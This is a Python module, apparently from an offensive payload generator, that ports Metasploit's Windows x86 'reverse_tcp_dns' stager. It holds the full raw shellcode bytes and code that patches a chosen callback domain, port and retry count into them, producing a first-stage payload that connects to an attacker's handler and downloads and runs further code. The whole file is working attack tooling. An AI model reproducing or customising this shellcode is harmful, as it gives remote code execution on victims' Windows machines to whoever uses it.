"""
reverse_tcp DNS payload
Completely ported from Metasploit Framework:
    https://github.com/rapid7/metasploit-framework/blob/master/modules/payloads/stagers/windows/reverse_tcp_dns.rb
"""

import binascii
import codecs
from lib.common import helpers


class ShellcodeModule:

    def __init__(self, cli_arguments):
        self.name = "Reverse TCP DNS Stager (Stage 1)"
        self.description = "Resolves DNS address, connects back to a handler\
        to download and run fun files :)"
        self.cli_name = "rev_tcp_dns"
        self.platform = "Windows"
        self.arch = "x86"
        self.retries_offset = 207
        self.lport_offset = 212
        self.lhost_offset = 248
        self.customized_shellcode = ""
        self.stager = (
            b"\xFC\xE8\x89\x00\x00\x00\x60\x89\xE5\x31\xD2\x64\x8B\x52\x30\x8B" +
            b"\x52\x0C\x8B\x52\x14\x8B\x72\x28\x0F\xB7\x4A\x26\x31\xFF\x31\xC0" +
            b"\xAC\x3C\x61\x7C\x02\x2C\x20\xC1\xCF\x0D\x01\xC7\xE2\xF0\x52\x57" +
            b"\x8B\x52\x10\x8B\x42\x3C\x01\xD0\x8B\x40\x78\x85\xC0\x74\x4A\x01" +
            b"\xD0\x50\x8B\x48\x18\x8B\x58\x20\x01\xD3\xE3\x3C\x49\x8B\x34\x8B" +
            b"\x01\xD6\x31\xFF\x31\xC0\xAC\xC1\xCF\x0D\x01\xC7\x38\xE0\x75\xF4" +
            b"\x03\x7D\xF8\x3B\x7D\x24\x75\xE2\x58\x8B\x58\x24\x01\xD3\x66\x8B" +
            b"\x0C\x4B\x8B\x58\x1C\x01\xD3\x8B\x04\x8B\x01\xD0\x89\x44\x24\x24" +
            b"\x5B\x5B\x61\x59\x5A\x51\xFF\xE0\x58\x5F\x5A\x8B\x12\xEB\x86\x5D" +
            b"\x68\x33\x32\x00\x00\x68\x77\x73\x32\x5F\x54\x68\x4C\x77\x26\x07" +
            b"\xFF\xD5\xB8\x90\x01\x00\x00\x29\xC4\x54\x50\x68\x29\x80\x6B\x00" +
            b"\xFF\xD5\x50\x50\x50\x50\x40\x50\x40\x50\x68\xEA\x0F\xDF\xE0\xFF" +
            b"\xD5\x97\xEB\x2F\x68\xA9\x28\x34\x80\xFF\xD5\x8B\x40\x1C\x6A\x05" +
            b"\x50\x68\x02\x00\x11\x5C\x89\xE6\x6A\x10\x56\x57\x68\x99\xA5\x74" +
            b"\x61\xFF\xD5\x85\xC0\x74\x51\xFF\x4E\x08\x75\xEC\x68\xF0\xB5\xA2" +
            b"\x56\xFF\xD5\xE8\xCC\xFF\xFF\xFF\x58\x58\x58\x58\x58\x58\x58\x58" +
            b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58" +
            b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58" +
            b"\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58\x58" +
            b"\x58\x58\x58\x58\x58\x58\x58\x00\x6A\x00\x6A\x04\x56\x57\x68\x02" +
            b"\xD9\xC8\x5F\xFF\xD5\x8B\x36\x6A\x40\x68\x00\x10\x00\x00\x56\x6A" +
            b"\x00\x68\x58\xA4\x53\xE5\xFF\xD5\x93\x53\x6A\x00\x56\x53\x57\x68" +
            b"\x02\xD9\xC8\x5F\xFF\xD5\x01\xC3\x29\xC6\x85\xF6\x75\xEC\xC3")
        self.required_options = {
            "LHOST": ["", "LHOST domain value"],
            "LPORT": ["", "LPORT value"],
            "Encoder": ["None", "Optional: Encoder to use when avoiding bad characters"],
            "BadChars": ["\\x00", "Optional: Bad characters to avoid"]
        }

    def cli_gen_shellcode(self):
        '''Invokes payload generating function since nothing special is needed
        for cli specifically'''
        self.payload_gen()
        return

    def gen_shellcode(self):
        '''Invoked by main menu, generates code'''
        self.payload_gen()
        return

    def payload_gen(self):
        # Take the passed in attributes and gen shellcode
        ip_shellcode = ""
        n = 2
        ip_shellcode_stage = binascii.hexlify(self.required_options["LHOST"][0].encode())
        ip_shellcode_stage = [ip_shellcode_stage[i:i+n] for i in range(0, len(ip_shellcode_stage), n)]
        for two_bytes in ip_shellcode_stage:
            ip_shellcode += '\\x' + two_bytes.decode('UTF-8')

        # convert port to shellcode
        port_shellcode_stage = str(hex(int(self.required_options['LPORT'][0])).lstrip('0'))
        if len(port_shellcode_stage.lstrip('x')) == 3:
            # detect if odd number, is so, need to add a '0' to the front
            port_1half = '0' + port_shellcode_stage[0:2].lstrip('x')
            port_1half = '\\x' + port_1half
            port_2half = port_shellcode_stage[2:4]
            port_2half = '\\x' + port_2half
            port_shellcode = port_1half + port_2half
        elif len(port_shellcode_stage.lstrip('x')) == 4:
            port_1half = port_shellcode_stage[1:3]
            port_1half = '\\x' + port_1half
            port_2half = port_shellcode_stage[3:5]
            port_2half = '\\x' + port_2half
            port_shellcode = port_1half + port_2half
        elif len(port_shellcode_stage.lstrip('x')) == 2:
            port_1half = port_shellcode_stage[1:3].lstrip('x')
            port_1half = '\\x' + port_1half
            port_2half = '00'
            port_2half = '\\x' + port_2half
            port_shellcode = port_2half + port_1half
        elif len(port_shellcode_stage.lstrip('x')) == 1:
            port_1half = port_shellcode_stage.lstrip('x')
            port_1half = '\\x0' + port_1half
            port_2half = '\\x00'
            port_shellcode = port_2half + port_1half

        retries = '\\x09'

        stager_shellcode = codecs.encode(self.stager[0:self.retries_offset], 'hex')
        stager_shellcode = "\\x" + '\\x'.join(codecs.decode(stager_shellcode[i:i + 2], 'utf-8') for i in range(0, len(stager_shellcode), 2))
        stager_shellcode += retries

        stager_shellcode2 = codecs.encode(self.stager[self.retries_offset + 1:self.lport_offset], 'hex')
        stager_shellcode2 = "\\x" + '\\x'.join(codecs.decode(stager_shellcode2[i:i + 2], 'utf-8') for i in range(0, len(stager_shellcode2), 2))
        stager_shellcode2 += port_shellcode

        stager_shellcode3 = codecs.encode(self.stager[self.lport_offset + 2:self.lhost_offset], 'hex')
        stager_shellcode3 = "\\x" + '\\x'.join(codecs.decode(stager_shellcode3[i:i + 2], 'utf-8') for i in range(0, len(stager_shellcode3), 2))
        stager_shellcode3 += ip_shellcode
        stager_shellcode3 += "\\x00"

        stager_p2 = codecs.encode(self.stager[self.lhost_offset + len(self.required_options["LHOST"][0]) + 1:], 'hex')
        stager_p2 = "\\x" + '\\x'.join(codecs.decode(stager_p2[i:i + 2], 'utf-8') for i in range(0, len(stager_p2), 2))

        self.customized_shellcode = stager_shellcode + stager_shellcode2 + stager_shellcode3 + stager_p2
        return

    def print_shellcode(self):
        print(self.customized_shellcode)
        return

    def payload_stats(self):
        print(" [*] Payload Name: " + helpers.color(self.name))
        print(" [*] IP Address: " + helpers.color(self.required_options['LHOST'][0]))
        print(" [*] Port: " + helpers.color(str(self.required_options['LPORT'][0])))
        print(" [*] Shellcode Size: " + helpers.color(str(len(self.customized_shellcode) / 4).rstrip('.0') + '\n'))
        print(self.customized_shellcode)
        return
